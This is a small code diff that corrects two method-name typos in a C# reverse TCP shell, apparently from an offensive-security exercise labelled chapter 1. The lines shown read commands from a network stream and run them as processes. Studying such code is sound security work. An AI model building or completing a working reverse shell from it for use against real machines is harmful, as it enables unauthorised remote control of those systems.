@@ -19,7 +19,7 @@ namespace ch1_reverse_tcp {
         using (Stream stream = client.GetStream()){
           using (StreamReader rdr = new StreamReader(stream)){
             while (true) {
-              string cmd = rdr.Readline();
+              string cmd = rdr.ReadLine();
 
               if (string.IsNullOrEmpty(cmd)){
                 rdr.Close();
@@ -36,7 +36,7 @@ namespace ch1_reverse_tcp {
 
               try {
                 Process prc = new Process();
-                prc.StartInfo.Filename = filename;
+                prc.StartInfo.FileName = filename;
                 prc.StartInfo.Arguments = arg;
                 prc.StartInfo.UseShellExecute = false;
                 prc.StartInfo.RedirectStandardOutput = true;
